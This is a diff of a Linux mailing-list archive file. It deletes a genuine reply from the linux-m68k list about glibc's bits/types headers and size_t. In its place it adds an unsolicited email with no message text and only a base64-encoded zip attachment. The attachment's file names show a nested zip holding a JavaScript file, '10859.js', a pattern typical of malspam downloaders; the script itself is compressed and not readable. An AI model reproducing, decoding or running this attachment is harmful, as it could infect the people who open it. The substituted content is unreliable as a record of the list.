@@ -1,82 +1,136 @@
-From: "Carlos O'Donell" <carlos@systemhalted.org>
-Subject: Re: [PATCH] uapi: fix asm/signal.h userspace compilation errors
-Date: Mon, 6 Mar 2017 10:10:18 -0500
-Message-ID: <CAE2sS1jTyENymA-fSAk4dt29rYgX50zYqubVYnGVGnFrH=-1nA__15432.5069430799$1488813035$gmane$org@mail.gmail.com>
-References: <20170226010156.GA28831@altlinux.org> <CAK8P3a0YX3RGAqWN0mwUJtBsqUX0C+QRtJLrT_UA=wX6Z+q0DA@mail.gmail.com>
- <CAE2sS1h9QNV+31GMSv8aahJYOb9hFtFp5Aj-yVOfg7cjBHr_kg@mail.gmail.com>
- <20170302154845.GB3503@altlinux.org> <CAE2sS1i-xezJu2hHfzOxpCMZHc2J+dsturtqFPMRWHa6mm6ccQ@mail.gmail.com>
+From: <armouralumni@yahoo.com>
+Subject: 30866 linux-m68k
+Date: Thu, 16 Mar 2017 01:51:02 -0000
+Message-ID: <148962906274.25821.7208376797190007021@ytc.ru>
+Reply-To: <armouralumni@yahoo.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
+Content-Type: application/zip; name="30686759358386.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-m68k-owner@vger.kernel.org>
-In-Reply-To: <CAE2sS1i-xezJu2hHfzOxpCMZHc2J+dsturtqFPMRWHa6mm6ccQ@mail.gmail.com>
+Content-Disposition: attachment
 Sender: linux-m68k-owner@vger.kernel.org
 List-Id: linux-m68k@vger.kernel.org
-To: "Dmitry V. Levin" <ldv@altlinux.org>
-Cc: Arnd Bergmann <arnd@arndb.de>, Russell King <linux@armlinux.org.uk>, Haavard Skinnemoen <hskinnemoen@gmail.com>, Hans-Christian Egtvedt <egtvedt@samfundet.no>, Mikael Starvik <starvik@axis.com>, Jesper Nilsson <jesper.nilsson@axis.com>, Yoshinori Sato <ysato@users.sourceforge.jp>, Tony Luck <tony.luck@intel.com>, Fenghua Yu <fenghua.yu@intel.com>, Geert Uytterhoeven <geert@linux-m68k.org>, Ralf Baechle <ralf@linux-mips.org>, David Howells <dhowells@redhat.com>, "James E.J. Bottomley" <jejb@parisc-linux.org>, Helge Deller <deller@gmx.de>, Benjamin Herrenschmidt <benh@kernel.crashing.org>, Paul Mackerras <paulus@samba.org>, Michael Ellerman <mpe@ellerman.id.au>, Martin Schwidefsky <schwidefsky@de.ibm.com>, Heiko Carstens <heiko.carstens@de.ibm.>
+To: linux-m68k <linux-m68k@lists.linux-m68k.org>
 
-On Fri, Mar 3, 2017 at 8:23 PM, Carlos O'Donell <carlos@systemhalted.org> wrote:
-> On Thu, Mar 2, 2017 at 10:48 AM, Dmitry V. Levin <ldv@altlinux.org> wrote:
->> On Thu, Mar 02, 2017 at 10:22:18AM -0500, Carlos O'Donell wrote:
->>> On Wed, Mar 1, 2017 at 11:20 AM, Arnd Bergmann <arnd@arndb.de> wrote:
->>> > On Sun, Feb 26, 2017 at 2:01 AM, Dmitry V. Levin <ldv@altlinux.org> wrote:
->>> >> Include <stddef.h> (guarded by #ifndef __KERNEL__) to fix asm/signal.h
->>> >> userspace compilation errors like this:
->>> >>
->>> >> /usr/include/asm/signal.h:126:2: error: unknown type name 'size_t'
->>> >>   size_t ss_size;
->>> >>
->>> >> As no uapi header provides a definition of size_t, inclusion
->>> >> of <stddef.h> seems to be the most conservative fix available.
->> [...]
->>> > I'm not sure if this is the best fix. We generally should not include one
->>> > standard header from another standard header. Would it be possible
->>> > to use __kernel_size_t instead of size_t?
->>>
->>> In glibc we handle this with special use of __need_size_t with GCC's
->>> provided stddef.h.
->>>
->>> For example glibc's signal.h does this:
->>>
->>> # define __need_size_t
->>> # include <stddef.h>
->>
->> Just to make it clear, do you suggest this approach for asm/signal.h as well?
-
-The best practice from the glibc community looks like this:
-
-(a) Create a bits/types/*.h header for the type you need.
-
-e.g.
-./time/bits/types/struct_timeval.h
-./time/bits/types/struct_itimerspec.h
-./time/bits/types/time_t.h
-./time/bits/types/struct_timespec.h
-./time/bits/types/struct_tm.h
-./time/bits/types/clockid_t.h
-./time/bits/types/clock_t.h
-./time/bits/types/timer_t.h
-
-(b) If neccessary the bits/types/*.h header is a wrapper:
-~~~
-#define __need_size_t
-#include <stddef.h>
-~~~
-to get access to the compiler provided type.
-
-This way all of the code you need simplifies to includes for the types you need.
-
-e.g.
-
-time/sys/time.h:
-...
-#include <bits/types.h>
-#include <bits/types/time_t.h>
-#include <bits/types/struct_timeval.h>
-...
-
-This is what we've been doing in glibc starting last September as we
-cleaned up all the convoluted conditional logic to get the types we
-needed in the headers that needed them.
-
-Cheers,
-Carlos.
+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
+jhoAAAAA
